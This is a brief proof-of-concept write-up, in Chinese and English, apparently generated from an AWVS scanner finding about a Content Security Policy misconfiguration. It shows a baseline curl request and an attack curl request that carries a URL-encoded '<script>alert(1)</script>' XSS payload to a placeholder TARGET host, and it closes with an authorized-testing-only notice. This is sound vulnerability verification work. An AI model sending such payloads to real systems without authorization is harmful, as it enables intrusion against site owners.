# POC — AWVS: Content Security Policy Misconfiguration

- finding_id: `URL-7e640209d2bc`
- type: `csp` / CWE-693
- severity: `medium`
- file: `:0`

## 步骤

1. **Baseline request**  
```http
curl -sS -i -X GET 'http://TARGET:8080/021.php?include=SafeText' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*'
```
预期：HTTP 200 and the normal application response.

2. **Replay the AWVS attack request (CSP 配置缺陷)**  
```http
curl -sS -i -X GET 'http://TARGET:8080/021.php?include=%3Cscript%3Ealert%281%29%3C%2Fscript%3E' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*'
```
预期：The attack response differs from the baseline in status, length, or a security-relevant marker.

3. **Compare baseline and attack responses**  
预期：A security-relevant differential appears.

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。